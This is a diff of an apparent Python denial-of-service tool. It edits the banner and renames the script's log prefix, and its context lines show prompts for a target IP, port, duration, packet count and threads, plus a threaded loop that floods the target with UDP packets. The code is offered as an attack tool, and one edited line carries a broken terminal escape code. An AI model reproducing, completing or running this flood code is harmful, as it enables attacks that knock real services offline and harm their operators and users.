@@ -25,10 +25,10 @@ print("\033[33m    ®     ®   ®   ® ®    ® ® ®   ® ® ® ® ®    ®    
 print("\033[1m   ® ® ® ® ®  ®     ®         ®  ®       ®   ® ® ® ® ®    \033[0m")
 print("\033[1m  ®         ®   ® ®  ®   ® ® ®   ®       ®  ®         ®    \033[0m")
 print("\033[32m ========================================================      \033[0m")                                    
-print("\033[31m||            B I R R U H   B I D D A M                ||\033[0m")
-print("\033[33m||                                                     ||\033[0m")
-print("\033[31m||        N A F D I K A   Y A A   A Q S H A            ||\033[0m")
-print("\033[32m||                                                     ||\033[0m")
+print("\033[31m||            B I R R U H   B I D D A M                 ||\033[0m")
+print("\033[33m||                                                      ||\033[0m")
+print("\033[31m||        N A F D I K A   Y A A   A Q S H A             ||\033[0m")
+print("\033[32m||                                  ~internal script~   ||\033[0m")
 print("\033[32m||======================================BY: ZANAHMAD ====\033[0m")
 
 
@@ -40,7 +40,7 @@ def get_user_input():
     attack_time = input("\033[33m | Time (seconds) : \033[0m").strip()
     packet = input("\033[33m | Packet : \033[0m").strip()
     thread_count = input("\033[33m | Thread : \033[0m").strip()
-    method = input("\033[1m | Method (UDP/TCP & UDP Mix) : \033[0m").strip().lower()
+    method = input("\032[1m | Method (UDP/TCP & UDP Mix) : \033[0m").strip().lower()
     print(" ========================================================")
 
     return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method
@@ -67,10 +67,10 @@ def udp_attack(ip, port, packet, duration, thread_count):
         try:
             for _ in range(packet):
                 s.sendto(data, (ip, port))
-            print(f"[SNIPER_ELITE] Attacking... >  time {duration} target {ip}:{port} packet {packet} threads {thread_count}")
+            print(f"\033[33m[BADAI AL-AQSHA] Attacking... >  time {duration} target {ip}:{port} packet {packet} threads {thread_count}\033[0m")
         except socket.error:
             s.close()
-            print("[SNIPER_ELITE] Error during attack, socket closed.")
+            print("[BADAI AL-AQSHA] Error during attack, socket closed.")
             break
 
 # Threaded attack function
@@ -80,10 +80,11 @@ def start_attack(target_ip, target_port, packet, thread_count, method, duration)
             th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
             th.start()
     else:
-        print("[SNIPER_ELITE] Unsupported method. Only UDP supported in this version.")
+        print("[BADAI AL-AQSHA] Unsupported method. Only UDP supported in this version.")
 
 # Main program flow
 def main():
+    display_banner()  # Show the banner initially
     target_ip, target_port, attack_time, packet, thread_count, method = get_user_input()
     display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method)
 
@@ -94,5 +95,5 @@ if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print("\n[SNIPER_ELITE] Attack interrupted. Exiting...")
+        print("\n[BADAI AL-AQSHA] Attack interrupted. Exiting...")
         sys.exit()
